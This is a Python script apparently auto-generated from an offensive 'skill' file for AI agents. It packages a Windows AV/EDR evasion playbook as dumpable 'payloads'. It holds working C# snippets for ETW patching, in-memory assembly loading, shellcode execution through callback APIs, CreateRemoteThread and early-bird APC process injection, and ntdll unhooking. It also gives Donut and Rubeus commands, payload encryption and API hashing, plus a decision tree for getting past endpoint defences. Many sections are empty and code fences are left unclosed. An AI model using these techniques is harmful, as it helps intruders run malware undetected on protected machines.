#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: hack-skills/windows-av-evasion

Skill: SKILL: AV/EDR Evasion — Expert Attack Playbook
Desc : >-

Run:  python hack-skills-windows-av-evasion.py --help
      python hack-skills-windows-av-evasion.py --list
      python hack-skills-windows-av-evasion.py --dump <section>
"""
import sys, json, argparse

NAME = 'hack-skills/windows-av-evasion'
TITLE = 'SKILL: AV/EDR Evasion — Expert Attack Playbook'
DESCRIPTION = '>-'

PAYLOADS = {
    'main': ["name: windows-av-evasion", "description: >-", "AV/EDR evasion playbook for Windows. Use when bypassing AMSI, ETW, .NET assembly detection, shellcode execution, process injection, API hooking, and signature-based detection on Windows endpoints."],
    'skill-av-edr-evasion-expert-attack-playbook': [],
    '0-related-routing': ["Before going deep, consider loading:", "- [windows-privilege-escalation](../windows-privilege-escalation/SKILL.md) when privesc tools are blocked by AV", "- [windows-lateral-movement](../windows-lateral-movement/SKILL.md) when lateral movement tools trigger EDR", "- [active-directory-kerberos-attacks](../active-directory-kerberos-attacks/SKILL.md) when Rubeus/Mimikatz are detected", "- [active-directory-acl-abuse](../active-directory-acl-abuse/SKILL.md) for non-binary AD attacks (less AV-sensitive)"],
    'advanced-reference': ["Also load [AMSI_BYPASS_TECHNIQUES.md](./AMSI_BYPASS_TECHNIQUES.md) when you need:", "- Detailed AMSI bypass code patterns (memory patching, reflection)", "- PowerShell-specific AMSI bypasses", "- .NET AMSI bypass techniques"],
    '1-amsi-bypass-overview': ["AMSI (Antimalware Scan Interface) inspects PowerShell, .NET, VBScript, JScript, and Office macros at runtime."],
    'key-amsi-bypass-categories': [],
    'quick-amsi-bypass-one-liners': ["```powershell"],
    'powershell-v2-downgrade-if-net-2-0-available-no-amsi-in-v2': ["powershell -Version 2"],
    'reflection-based-set-amsiinitfailed-true': [],
    'obfuscated-to-avoid-static-detection-see-amsi-bypass-techniques-md-for-full-patterns': [],
    '2-etw-bypass': ["ETW (Event Tracing for Windows) feeds telemetry to EDR. Patching `EtwEventWrite` stops .NET assembly load events."],
    'patch-etweventwrite': ["```csharp", "// C# \u2014 patch EtwEventWrite to return immediately", "var ntdll = GetModuleHandle(\"ntdll.dll\");", "var etwAddr = GetProcAddress(ntdll, \"EtwEventWrite\");", "// Write: ret (0xC3) to first byte", "VirtualProtect(etwAddr, 1, 0x40, out uint oldProtect);", "Marshal.WriteByte(etwAddr, 0xC3);", "VirtualProtect(etwAddr, 1, oldProtect, out _);"],
    'powershell-etw-bypass': ["```powershell"],
    'disable-script-block-logging-etw-provider': ["[Reflection.Assembly]::LoadWithPartialName('System.Management.Automation')"],
    'set-internal-field-to-disable-etw-tracing': [],
    '3-net-assembly-loading': [],
    'in-memory-assembly-load': ["```csharp", "byte[] assemblyBytes = File.ReadAllBytes(\"tool.exe\");", "// Or download from URL, decrypt from resource", "Assembly assembly = Assembly.Load(assemblyBytes);", "assembly.EntryPoint.Invoke(null, new object[] { args });"],
    'donut-convert-net-assembly-to-shellcode': ["```bash"],
    'generate-shellcode-from-net-exe': ["donut -f tool.exe -o payload.bin -a 2 -c ToolNamespace.Program -m Main"],
    'with-parameters': ["donut -f Rubeus.exe -o rubeus.bin -a 2 -p \"kerberoast /outfile:tgs.txt\""],
    'then-load-shellcode-via-any-injection-technique-5': [],
    'execute-assembly-c2-framework': [],
    'cobalt-strike': ["execute-assembly /path/to/Rubeus.exe kerberoast"],
    'sliver': ["execute-assembly /path/to/SharpHound.exe -c all"],
    'havoc': ["dotnet inline-execute /path/to/tool.exe args"],
    '4-shellcode-execution-techniques': [],
    'virtualalloc-callback-avoids-createthread': ["```csharp", "IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)sc.Length, 0x3000, 0x40);", "Marshal.Copy(sc, 0, addr, sc.Length);", "// Use callback API instead of CreateThread (less monitored)", "EnumWindows(addr, IntPtr.Zero);", "**Callback APIs for shellcode execution**: `EnumWindows`, `EnumChildWindows`, `EnumFonts`, `EnumDesktops`, `CertEnumSystemStore`, `EnumDateFormats` \u2014 all accept function pointers that can point to shellcode."],
    '5-process-injection-techniques': [],
    'createremotethread-basic-pattern': ["```csharp", "IntPtr hProcess = OpenProcess(0x001F0FFF, false, targetPid);", "IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, (uint)sc.Length, 0x3000, 0x40);", "WriteProcessMemory(hProcess, addr, sc, (uint)sc.Length, out _);", "CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);"],
    'early-bird-apc-injection': ["```csharp", "// Create suspended process", "STARTUPINFO si = new STARTUPINFO();", "PROCESS_INFORMATION pi = new PROCESS_INFORMATION();", "CreateProcess(null, \"C:\\\\Windows\\\\System32\\\\svchost.exe\", ..., CREATE_SUSPENDED, ..., ref si, ref pi);", "// Allocate and write shellcode", "IntPtr addr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)sc.Length, 0x3000, 0x40);", "WriteProcessMemory(pi.hProcess, addr, sc, (uint)sc.Length, out _);", "// Queue APC to main thread (runs before main entry point)", "QueueUserAPC(addr, pi.hThread, IntPtr.Zero);", "ResumeThread(pi.hThread);"],
    '6-unhooking-bypass-edr-api-hooks': [],
    'direct-syscalls-syswhispers-hellsgate': ["EDR hooks `ntdll.dll` functions. Direct syscalls bypass hooks by invoking the kernel directly.", "Normal: User code \u2192 ntdll.dll (HOOKED) \u2192 kernel", "Direct: User code \u2192 syscall instruction \u2192 kernel (bypasses hook)"],
    'fresh-ntdll-copy': ["```csharp", "// Read clean ntdll.dll from disk", "byte[] cleanNtdll = File.ReadAllBytes(@\"C:\\Windows\\System32\\ntdll.dll\");", "// Or from KnownDlls: \\KnownDlls\\ntdll.dll", "// Or from suspended process (create sacrificial process, read its ntdll)", "// Overwrite hooked .text section with clean copy", "// \u2192 All EDR hooks in ntdll are removed"],
    'indirect-syscalls': ["// Instead of: syscall (in your code \u2014 suspicious)", "// Do: jump to syscall instruction inside ntdll.dll (legitimate location)", "// The ret address on stack points to ntdll.dll, not your code"],
    '7-payload-encryption-obfuscation': [],
    'encryption-methods': ["```csharp", "// AES encryption (preferred)", "using Aes aes = Aes.Create();", "aes.Key = key; aes.IV = iv;", "byte[] encrypted = aes.CreateEncryptor().TransformFinalBlock(shellcode, 0, shellcode.Length);", "// XOR (simple, fast)", "for (int i = 0; i < shellcode.Length; i++)", "shellcode[i] ^= key[i % key.Length];", "// RC4 (stream cipher, simple implementation)"],
    'sleep-obfuscation': ["Encrypt shellcode in memory during sleep to avoid memory scanners."],
    'staged-loading': ["Stage 1: Small, encrypted loader (evades static analysis)", "Stage 2: Download actual payload at runtime (encrypted)", "Stage 3: Decrypt in memory \u2192 execute"],
    '8-signature-evasion': [],
    'string-encryption': ["```csharp", "// Avoid plaintext API names, URLs, tool names", "// Use encrypted strings, decrypt at runtime", "string decrypted = Decrypt(encryptedApiName);", "IntPtr funcPtr = GetProcAddress(GetModuleHandle(\"kernel32.dll\"), decrypted);"],
    'api-hashing': ["```csharp", "// Resolve API by hash instead of name (avoids string detection)", "// Hash \"VirtualAlloc\" \u2192 0x91AFCA54", "IntPtr func = GetProcAddressByHash(module, 0x91AFCA54);"],
    'metadata-removal': ["```bash"],
    'strip-net-metadata': ["ConfuserEx / .NET Reactor / Obfuscar"],
    'remove-pe-metadata-timestamps-rich-header-debug-info': [],
    'modify-compilation-timestamps': [],
    'strip-pdb-paths': [],
    'c2-framework-evasion': [],
    '9-av-edr-evasion-decision-tree': ["Need to execute tool/payload on protected host", "\u251c\u2500\u2500 PowerShell-based payload?", "\u2502   \u251c\u2500\u2500 AMSI blocking? \u2192 AMSI bypass first (\u00a71)", "\u2502   \u2502   \u251c\u2500\u2500 .NET 2.0 available? \u2192 PS v2 downgrade (no AMSI)", "\u2502   \u2502   \u251c\u2500\u2500 Memory patch AmsiScanBuffer", "\u2502   \u2502   \u2514\u2500\u2500 Reflection-based bypass", "\u2502   \u251c\u2500\u2500 Script Block Logging? \u2192 ETW bypass (\u00a72)", "\u2502   \u2514\u2500\u2500 Constrained Language Mode? \u2192 CLM bypass or switch to C#", "\u251c\u2500\u2500 .NET assembly (Rubeus, SharpHound, etc.)?", "\u2502   \u251c\u2500\u2500 Direct execution blocked?", "\u2502   \u2502   \u251c\u2500\u2500 In-memory Assembly.Load (\u00a73)", "\u2502   \u2502   \u251c\u2500\u2500 Convert to shellcode with Donut (\u00a73)", "\u2502   \u2502   \u2514\u2500\u2500 Use C2 execute-assembly (\u00a73)", "\u2502   \u2514\u2500\u2500 Still detected?", "\u2502       \u251c\u2500\u2500 Obfuscate assembly (ConfuserEx)", "\u2502       \u251c\u2500\u2500 Modify source + recompile", "\u2502       \u2514\u2500\u2500 Use BOFs (Beacon Object Files) if CS", "\u251c\u2500\u2500 Shellcode execution needed?", "\u2502   \u251c\u2500\u2500 Basic \u2192 VirtualAlloc + callback (\u00a74)", "\u2502   \u251c\u2500\u2500 Need injection \u2192 choose technique by OPSEC (\u00a75)", "\u2502   \u2502   \u251c\u2500\u2500 Low detection needed \u2192 module stomping or phantom DLL", "\u2502   \u2502   \u251c\u2500\u2500 Medium \u2192 early bird APC or NtMapViewOfSection", "\u2502   \u2502   \u2514\u2500\u2500 Quick and dirty \u2192 CreateRemoteThread", "\u2502   \u2514\u2500\u2500 Memory scanners detect payload?", "\u2502       \u251c\u2500\u2500 Encrypt payload \u2192 decrypt only at execution (\u00a77)", "\u2502       \u2514\u2500\u2500 Sleep obfuscation (Ekko/Foliage) (\u00a77)", "\u251c\u2500\u2500 EDR hooking ntdll.dll?", "\u2502   \u251c\u2500\u2500 Direct syscalls (SysWhispers3/HellsGate) (\u00a76)", "\u2502   \u251c\u2500\u2500 Fresh ntdll copy from disk/KnownDlls (\u00a76)", "\u2502   \u2514\u2500\u2500 Indirect syscalls (return to ntdll instruction) (\u00a76)", "\u251c\u2500\u2500 Signature detection?", "\u2502   \u251c\u2500\u2500 Known tool signature \u2192 modify + recompile", "\u2502   \u251c\u2500\u2500 String-based \u2192 string encryption / API hashing (\u00a78)", "\u2502   \u251c\u2500\u2500 PE metadata \u2192 strip/modify (\u00a78)", "\u2502   \u2514\u2500\u2500 Behavioral \u2192 change execution flow, add junk code", "\u2514\u2500\u2500 All local evasion fails?", "\u251c\u2500\u2500 Use Living-off-the-Land (LOLBins): certutil, mshta, regsvr32", "\u251c\u2500\u2500 Use legitimate admin tools (PsExec, WMI, WinRM)", "\u2514\u2500\u2500 Switch to fileless / memory-only techniques"],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()